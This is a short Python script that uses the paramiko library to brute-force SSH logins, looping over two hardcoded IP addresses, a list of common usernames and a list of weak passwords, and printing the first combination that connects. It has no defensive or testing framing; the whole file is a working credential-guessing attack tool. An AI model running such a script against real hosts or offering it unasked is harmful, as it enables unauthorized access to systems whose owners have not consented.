import paramiko

passwords = ['clone2026', 'password', '12345', 'admin', 'root', 'itcloud']
users = ['foodflow', 'root', 'ubuntu', 'itcloud', 'hayot', 'user', 'admin']
ips = ['100.69.189.125', '100.92.238.113']

found = False
for ip in ips:
    if found: break
    for u in users:
        if found: break
        for p in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip, username=u, password=p, timeout=2)
                print(f"SUCCESS: {ip} user={u} pass={p}")
                found = True
                ssh.close()
                break
            except Exception:
                pass
